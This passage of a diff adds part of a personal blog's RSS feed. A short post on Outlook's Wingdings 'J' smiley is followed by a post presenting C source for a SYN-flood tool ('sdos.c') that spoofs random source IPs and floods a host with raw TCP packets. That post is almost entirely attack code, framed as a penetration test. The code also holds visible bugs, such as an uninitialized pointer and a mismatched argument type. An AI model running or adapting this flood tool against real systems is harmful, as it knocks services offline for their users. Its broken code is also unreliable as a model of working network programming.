+            color: #0563C1;
+            text-decoration: underline;
+        }
+        
+        a:visited,
+        span.MsoHyperlinkFollowed {
+            mso-style-priority: 99;
+            color: #954F72;
+            text-decoration: underline;
+        }
+        
+        span.EmailStyle17 {
+            mso-style-type: personal-compose;
+            font-family: Calibri;
+            color: windowtext;
+        }
+        
+        span.msoIns {
+            mso-style-type: export-only;
+            mso-style-name: &quot;&quot;;
+            text-decoration: underline;
+            color: teal;
+        }
+        
+        .MsoChpDefault {
+            mso-style-type: export-only;
+            font-family: Calibri;
+        }
+        
+        @page WordSection1 {
+            size: 8.5in 11.0in;
+            margin: 1.0in 1.0in 1.0in 1.0in;
+        }
+        
+        div.WordSection1 {
+            page: WordSection1;
+        }
+        
+        --&gt;
+    &lt;/style&gt;
+&lt;/head&gt;
+
+&lt;body bgcolor=&quot;white&quot; lang=&quot;EN-US&quot; link=&quot;#0563C1&quot; vlink=&quot;#954F72&quot;&gt;
+    &lt;div class=&quot;WordSection1&quot;&gt;
+        &lt;p class=&quot;MsoNormal&quot;&gt;&lt;span style=&quot;font-size:11.0pt&quot;&gt;Hey this is a test! &lt;/span&gt;&lt;span style=&quot;font-size:11.0pt;font-family:Wingdings&quot;&gt;J&lt;/span&gt;&lt;span style=&quot;font-size:11.0pt&quot;&gt;
+&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;&lt;/p&gt;
+        &lt;p class=&quot;MsoNormal&quot;&gt;&lt;span style=&quot;font-size:11.0pt&quot;&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/span&gt;&lt;/p&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</pre>
+<h3 style="text-align: center;">The infamous capital j</h3>
+<p>If you have ever wondered why you see erroneous <code>j</code>&#8216;s floating around in emails, the unencoded sample from above can answer that as well.</p>
+<p>When a user (in the older Outlook tools) types <code>:)</code> the program will actually replace the smiley face with <code><span style="font-size: 11.0pt; font-family: Wingdings;">J</span></code> instead of <img src="https://s.w.org/images/core/emoji/2.3/72x72/1f60a.png" alt="&#x1f60a;" class="wp-smiley" style="height: 1em; max-height: 1em;" />.</p>
+<p>The source clearly shows that the smiley face being sent is encoded in the Wingdings font!</p>
+<pre class="brush: xml; title: ; notranslate">
+&lt;span style=&quot;font-size:11.0pt;font-family:Wingdings&quot;&gt;J&lt;/span&gt;
+</pre>
+<p>Wingdings is available for purchase here at <a href="https://www.microsoft.com/typography/fonts/">microsoft.com/typography/fonts</a> if you want to run it on your server to decode the <code>J</code>&#8216;s properly.</p>
+<h1 style="text-align: center;">tldr;</h1>
+<p style="text-align: center;">Older outlook clients used to do some wonky things with mime encoding and pseudo HTML formatting that conflicted with <code>ISO/IEC 15445</code></p>
+<p style="text-align: center;">Most clients probably don&#8217;t support the non-standard encoding (well).  So it&#8217;s another case of not adhering to standard to do things a proprietary way.</p>
+<p style="text-align: center;">So in theory, Outlook has been using emoticons since before emoticons were cool. NO BIG DEAL!</p>
+<p style="text-align: center;">Glad to know it&#8217;s working as expected now, and that we should see the problem disappear over time. So much ❤ for the engineers who helped fix this! jjj</p>
+]]></content:encoded>
+			<wfw:commentRss>https://www.nivenly.com/j/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+		</item>
+		<item>
+		<title>FreeBSD TCP handshake exploit</title>
+		<link>https://www.nivenly.com/freebsd-tcp-handshake-exploit/</link>
+		<comments>https://www.nivenly.com/freebsd-tcp-handshake-exploit/#respond</comments>
+		<pubDate>Thu, 02 Mar 2017 04:39:26 +0000</pubDate>
+		<dc:creator><![CDATA[Kris Nova]]></dc:creator>
+				<category><![CDATA[C]]></category>
+		<category><![CDATA[Unix]]></category>
+
+		<guid isPermaLink="false">http://www.nivenly.com/?p=188</guid>
+		<description><![CDATA[I have worked on exploiting a TCP handshake vulnerability using native FreeBSD C libraries. The original project can be found here.]]></description>
+				<content:encoded><![CDATA[<p>I have worked on exploiting a TCP handshake vulnerability using native FreeBSD C libraries.</p>
+<p>The original project can be found <a href="https://github.com/kris-nova/SYN-spoof" target="_blank" rel="noopener">here</a>.</p>
+<pre class="brush: cpp; title: ; notranslate">
+/*
+ * ============================================================================
+ *
+ * (c)2002-2014. Kris Nova. All rights reserved.
+ *
+ * Redistribution and use in source and binary forms, with or without
+ * modification, are permitted provided that the following conditions
+ * are met:
+ * 1. Redistributions of source code must retain the above copyright
+ *    notice, this list of conditions and the following disclaimer.
+ * 2. Redistributions in binary form must reproduce the above copyright
+ *    notice, this list of conditions and the following disclaimer in the
+ *    documentation and/or other materials provided with the distribution.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
+ * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING BUT NOT LIMITED TO, THE
+ * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+ * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
+ * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+ * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
+ * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+ * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
+ * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
+ * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
+ * SUCH DAMAGE.
+ *
+ *=============================================================================
+ *
+ * sdos.c
+ *
+ * Tested and compiled on FreeBSD 10+
+ *
+ * A simple C script to attempt to flood a server with SYN requests in the
+ * hopes of determining the threshold for availability.
+ *
+ * This is an isolated penetration test that will send requests via a unique
+ * thread.
+ *=============================================================================
+ */
+
+/* Includes */
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netinet/tcp.h&gt;
+#include &lt;netinet/ip.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;time.h&gt;
+
+/* Interface */
+int main(int argc, char *argv[]);
+unsigned short csum(unsigned short *ptr, int nbytes);
+void usage();
+int flood();
+char* randIp();
+
+/**
+ * configuration
+ *
+ * The basic information for defining where we will send the pen request
+ */
+struct configuration
+{
+	char *ip;
+	char *message;
+	int port;
+	int verbose;
+};
+
+/**
+ * main
+ *
+ * Handles argument parsing and building the configuration struct
+ *
+ * int argc The total amount of arguments passed
+ * char *argv[] Array of arguments space dilimited
+ */
+int main(int argc, char *argv[])
+{
+	//Set defaults
+	struct configuration cfg;
+	cfg.ip = &quot;127.0.0.1&quot;;
+	cfg.port = 1234;
+	cfg.message = &quot;...&quot;;
+	cfg.verbose = 0;
+
+	//Define
+	unsigned int seed;
+	unsigned int ii;
+
+	// Invalid command, display usage
+	int i;
+	if (argc &lt;= 2)
+	{
+		usage();
+		exit(0);
+	}
+
+	// Parse arguments
+	for (i = 0; i &lt; argc; i++)
+	{
+		if (argv[i][0] == '-')
+		{
+			switch (argv[i][1])
+			{
+			case 'v':
+				//Verbose
+				cfg.verbose = 1;
+				break;
+			case 'h':
+				//Host
+				cfg.ip = argv[i + 1];
+				break;
+			case 'p':
+				//Port
+				cfg.port = atoi(argv[i + 1]);
+				break;
+			case 'm':
+				//Message
+				cfg.message = argv[i + 1];
+				break;
+			}
+		}
+	}
+	//Call flood with our configuration
+	seed = time(NULL);
+	ii = 0;
+	while (flood(cfg))
+	{
+		seed++;
+		ii++;
+		srand(seed);
+		printf(&quot;Iterations: %i\n&quot;, ii);
+	}
+	//Fin
+	return 1;
+}
+
+/**
+ * csum
+ *
+ * Used to calculate the checksum
+ */
+unsigned short csum(unsigned short *ptr, int nbytes)
+{
+	register long sum;
+	unsigned short oddbyte;
+	register short answer;
+	sum = 0;
+	while (nbytes &gt; 1)
+	{
+		sum += *ptr++;
+		nbytes -= 2;
+	}
+	if (nbytes == 1)
+	{
+		oddbyte = 0;
+		*((u_char*) &amp;oddbyte) = *(u_char*) ptr;
+		sum += oddbyte;
+	}
+	sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff);
+	sum = sum + (sum &gt;&gt; 16);
+	answer = (short) ~sum;
+	return (answer);
+}
+
+/**
+ * flood
+ *
+ * The main function for the test
+ * Handles sending the packets to the server in test
+ */
+int flood(struct configuration *cfg)
+{
+	//Create a raw socket
+	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+	//Datagram to represent the packet
+	char datagram[4096], source_ip[32];
+	//IP header
+	struct ip *iph = (struct ip *) datagram;
+	//TCP header
+	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));
+	//Socket
+	struct sockaddr_in sin;
+	//Spoof struct (for calculation the checksum)
+	struct ippseudo ipps;
+
+	sin.sin_family = AF_INET;
+	sin.sin_port = htons(80);
+	//TODO random IP
+	sin.sin_addr.s_addr = inet_addr(randIp());
+
+	//Zero out the buffer
+	memset(datagram, 0, 4096);
+
+	//IP header
+	iph-&gt;ip_hl = 5;
+	iph-&gt;ip_v = 4;
+	iph-&gt;ip_tos = 0;
+	iph-&gt;ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
+	iph-&gt;ip_id = htons(54321);
+	iph-&gt;ip_off = 0;
+	iph-&gt;ip_ttl = 255;
+	iph-&gt;ip_p = IPPROTO_TCP;
+	iph-&gt;ip_sum = 0;
+	struct in_addr ipsrc;
+	ipsrc.s_addr = inet_addr(source_ip);
+	iph-&gt;ip_src = ipsrc;
+	struct in_addr ipdst;
+	ipdst.s_addr = sin.sin_addr.s_addr;
+	iph-&gt;ip_dst = ipdst;
+	iph-&gt;ip_sum = csum((unsigned short *) datagram, iph-&gt;ip_len &gt;&gt; 1);
+
+	//TCP Header
+	tcph-&gt;th_sport = htons(1234);
+	tcph-&gt;th_dport = htons(80);
+	tcph-&gt;th_seq = 0;
+	tcph-&gt;th_ack = 0;
+	//First and only TCP segment
+	tcph-&gt;th_off = 5;
+	tcph-&gt;th_flags = 00000010;
+	//Max window size
+	tcph-&gt;th_win = htons(5840);
+	//The kernel will handle calculation this
+	tcph-&gt;th_sum = 0;
+	tcph-&gt;th_urp = 0;
+
+	//Spoof struct
+	struct in_addr spfsrc;
+	spfsrc.s_addr = inet_addr(source_ip);
+	ipps.ippseudo_src = spfsrc;
+	struct in_addr spfdst;
+	spfdst.s_addr = sin.sin_addr.s_addr;
+	ipps.ippseudo_dst = spfdst;
+	ipps.ippseudo_pad = 0;
+	ipps.ippseudo_p = IPPROTO_TCP;
+	ipps.ippseudo_len = htons(20);
+
+	//Calculate checksum for the TCP header
+	tcph-&gt;th_sum = csum((unsigned short*) &amp;ipps, sizeof(struct ippseudo));
+
+	//IP_HDRINCL to tell the kernel that headers are included in the packet
+	int one = 1;
+	const int *val = &amp;one;
+	if (setsockopt(s, IPPROTO_IP, PF_INET, val, sizeof(one)) &lt; 0)
+	{
+		printf(&quot;Error setting IP_HDRINCL. &quot;
+				&quot;Error number : %d . &quot;
+				&quot;Error message : %s \n&quot;,
+		errno, strerror(errno));
+		exit(0);
+	}
+
+	//Send the packet
+	if (sendto(s, /* our socket */
+	datagram, /* the buffer containing headers and data */
+	iph-&gt;ip_len, /* total length of our datagram */
+	0, /* routing flags, normally always 0 */
+	(struct sockaddr *) &amp;sin, /* socket addr, just like in */
+	sizeof(sin)) &lt; 0) /* a normal send() */
+	{
+		printf(&quot;Packet transmission failed!\n&quot;);
+		return 1;
+	}
+	//Data send successfully
+	else
+	{
+		printf(&quot;Packet transmission success!\n&quot;);
+		return 1;
+	}
+}
+
+/**
+ * randIp
+ *
+ * Will generate a random IP address to spoof the packet with
+ */
+char* randIp()
+{
+	char *ip;
+	sprintf(ip,
+			&quot;%d.%d.%d.%d&quot;,
+			rand() &amp; 126,
+			rand() &amp; 255,
+			rand() &amp; 255,
+			rand() &amp; 255);
+	printf(&quot;Random IP: %s\n&quot;, ip);
+	return ip;
+}
+
+/**
+ * usage
+ *
+ * How do we run this thing
+ */
+void usage()
+{
+	printf(&quot;./sdos &lt;options&gt;\n&quot;);
+	printf(&quot;\n&quot;);
+	printf(&quot;v     Verbose - Enables verbosity\n&quot;);
+	printf(&quot;h     Host    - IP of host to connect to\n&quot;);
+	printf(&quot;p     Port    - The numerical port to connect on\n&quot;);
+	printf(&quot;m     Message - Optional message to send to the server\n&quot;);
+	printf(&quot;\n&quot;);
+
+}
+</pre>
+]]></content:encoded>
+			<wfw:commentRss>https://www.nivenly.com/freebsd-tcp-handshake-exploit/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+	</channel>
+</rss>
